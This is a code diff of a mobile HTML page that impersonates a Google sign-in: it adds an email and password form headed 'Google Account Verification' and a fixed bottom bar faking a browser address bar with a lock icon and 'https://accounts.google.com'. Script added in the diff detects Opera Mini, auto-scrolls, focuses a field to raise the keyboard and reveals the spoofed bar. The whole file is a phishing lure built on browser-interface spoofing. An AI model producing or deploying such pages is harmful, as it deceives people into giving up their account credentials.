@@ -2,116 +2,143 @@
 <html lang="en">
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Ultra Fixed Fake Bar</title>
+<title>Secure Login</title>
 
 <style>
   body {
     margin: 0;
-    font-family: sans-serif;
+    font-family: Arial, sans-serif;
+    background: #f2f2f2;
   }
 
-  .spacer { height: 900px; }
+  .content {
+    padding: 20px;
+    text-align: center;
+  }
+
+  .spacer {
+    height: 800px;
+  }
 
   textarea {
     width: 100%;
-    font-size: 18px;
     padding: 12px;
-    box-sizing: border-box;
+    font-size: 16px;
   }
 
-  /* 🔻 WRAPPER (fixed full width) */
-  .bar-wrap {
+  /* 🔒 Fake address bar */
+  .fake-bar {
     position: fixed;
-    left: 0;
     bottom: 0;
+    left: 0;
     width: 100%;
+    background: #ffffff;
+    border-top: 1px solid #ccc;
+    font-size: 14px;
+    padding: 8px 10px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
     z-index: 9999;
 
-    transform: translateY(100%);
-    transition: transform 0.15s ease;
+    opacity: 0;
+    transform: translateY(20px);
+    transition: 0.25s ease;
   }
 
-  .bar-wrap.show {
+  .fake-bar.show {
+    opacity: 1;
     transform: translateY(0);
   }
 
-  /* 🔻 actual bar */
-  .fake-bar {
-    background: #fff7f0;
-    border-top: 1px solid #e0cbb0;
-    text-align: center;
-    font-size: 15px;
-    padding: 12px;
+  .lock {
+    color: green;
+    font-weight: bold;
+  }
+
+  .url {
+    color: #333;
+  }
+
+  /* Fake login form */
+  .login-box {
+    background: white;
+    padding: 20px;
+    margin: 40px auto;
+    max-width: 300px;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+  }
+
+  input {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    font-size: 14px;
+  }
+
+  button {
+    width: 100%;
+    margin-top: 12px;
+    padding: 10px;
+    background: #4285f4;
+    color: white;
+    border: none;
+    font-size: 14px;
   }
 </style>
 </head>
 
 <body>
 
+<div class="content">
+  <h2>Google Account Verification</h2>
+  <p>Please login to continue</p>
+
+  <div class="login-box">
+    <input type="text" placeholder="Email">
+    <input type="password" placeholder="Password">
+    <button>Sign in</button>
+  </div>
+</div>
+
 <div class="spacer"></div>
 
-<textarea id="ta" placeholder="Type here..."></textarea>
+<textarea id="ta" placeholder="Tap here..."></textarea>
 
-<div class="spacer"></div>
-
-<div class="bar-wrap" id="barWrap">
-  <div class="fake-bar">https://google.com/search</div>
+<!-- 🔒 Fake address bar -->
+<div class="fake-bar" id="fakeBar">
+  <span class="lock">🔒</span>
+  <span class="url">https://accounts.google.com</span>
 </div>
 
 <script>
-const barWrap = document.getElementById("barWrap");
+const fakeBar = document.getElementById("fakeBar");
 const ta = document.getElementById("ta");
 
-let lastKeyboard = 0;
+/* detect Opera Mini */
+const isOperaMini =
+  Object.prototype.toString.call(window.operamini) === "[object OperaMini]" ||
+  navigator.userAgent.includes("Opera Mini");
 
-/* =========================
-   SHOW / HIDE
-========================= */
-function showBar() {
-  barWrap.classList.add("show");
+/* show fake bar */
+function showFakeBar() {
+  fakeBar.classList.add("show");
 }
 
-function hideBar() {
-  barWrap.classList.remove("show");
+/* auto scroll + focus */
+window.onload = () => {
+  setTimeout(() => {
+    window.scrollTo(0, 600);
+    ta.focus();
+    showFakeBar();
+  }, 800);
+};
+
+/* fallback */
+if (isOperaMini) {
+  ta.addEventListener("focus", showFakeBar);
 }
-
-/* =========================
-   PERFECT KEYBOARD DETECT
-   (NO GAP METHOD)
-========================= */
-function updateKeyboard() {
-  if (!window.visualViewport) return;
-
-  const vv = window.visualViewport;
-
-  // 🔥 REAL visible bottom gap
-  const bottomGap = window.innerHeight - vv.height - vv.offsetTop;
-
-  // instead of bottom positioning → move wrapper UP
-  barWrap.style.transform = `
-    translateY(calc(${bottomGap}px))
-  `;
-}
-
-/* =========================
-   EVENTS
-========================= */
-ta.addEventListener("focus", showBar);
-ta.addEventListener("click", showBar);
-ta.addEventListener("input", showBar);
-ta.addEventListener("blur", hideBar);
-
-/* =========================
-   TRACK KEYBOARD LIVE
-========================= */
-if (window.visualViewport) {
-  visualViewport.addEventListener("resize", updateKeyboard);
-  visualViewport.addEventListener("scroll", updateKeyboard);
-}
-
-window.addEventListener("resize", updateKeyboard);
-
-updateKeyboard();
 </script>
 
 </body>
